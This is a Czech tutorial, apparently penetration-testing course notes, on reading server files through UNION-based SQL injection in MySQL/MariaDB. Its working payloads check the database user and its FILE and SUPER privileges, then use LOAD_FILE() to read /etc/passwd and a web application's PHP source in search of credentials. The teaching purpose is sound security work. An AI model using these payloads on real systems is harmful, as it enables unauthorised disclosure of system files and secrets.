## 🔐 1. Oprávnění a kontrola uživatele

Kromě získávání dat z databáze umožňuje SQL Injection v MySQL/MariaDB také čtení souborů ze souborového systému serveru. Tato operace však vyžaduje příslušná databázová oprávnění.

### Zjištění aktuálního databázového uživatele

Prvním krokem je ověření, pod jakým uživatelem se k databázi připojujeme:

SQL

```
cn' UNION SELECT 1, user(), 3, 4-- -
-- nebo:
cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -
```

_Pokud výstup vrátí např. `root@localhost`, je vysoká pravděpodobnost, že máme správcovská (DBA) práva._

### Ověření oprávnění `FILE` a `SUPER`

Pro načítání souborů musí mít uživatel uděleno oprávnění **`FILE`** (a ideálně `SUPER_PRIV`):

1. **Kontrola super-uživatele:**
    
    SQL
    
    ```
    cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
    ```
    
    _(Vrátí-li hodnota `Y`, máme superuser privileges)._
    
2. **Výpis všech udělených práv z `information_schema`:**
    
    SQL
    
    ```
    cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
    ```
    
    _Pokud je v seznamu zobrazen typ oprávnění `FILE`, můžeme přistoupit ke čtení souborů._
    

## 📄 2. Čtení souborů pomocí `LOAD_FILE()`

Funkce `LOAD_FILE()` přijímá jako parametr absolutní cestu k souboru na serveru.

> ⚠️ **Podmínka:** Soubor lze přečíst pouze tehdy, pokud má systémový uživatel operačního systému (pod kterým běží proces MySQL/MariaDB, např. `mysql` nebo `www-data`) k danému souboru práva ke čtení.

### Příklad 1: Čtení systémového souboru `/etc/passwd`

SQL

```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

### Příklad 2: Čtení zdrojového kódu aplikace (`search.php`)

Tato technika se často používá k exfiltraci zdrojového kódu webu (vyhledání databázových přihlašovacích údajů či jiných zranitelností).

Ve standardním prostředí Linuxu/Apache bývá webroot složka `/var/www/html`:

SQL

```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

> 💡 **Tip:** Pokud se načtený PHP kód po vykreslení v prohlížeči nezobrazí správně (prohlížeč ho může interpretovat jako HTML), stačí si zobrazit zdrojový kód stránky (**Ctrl + U** / _View Page Source_).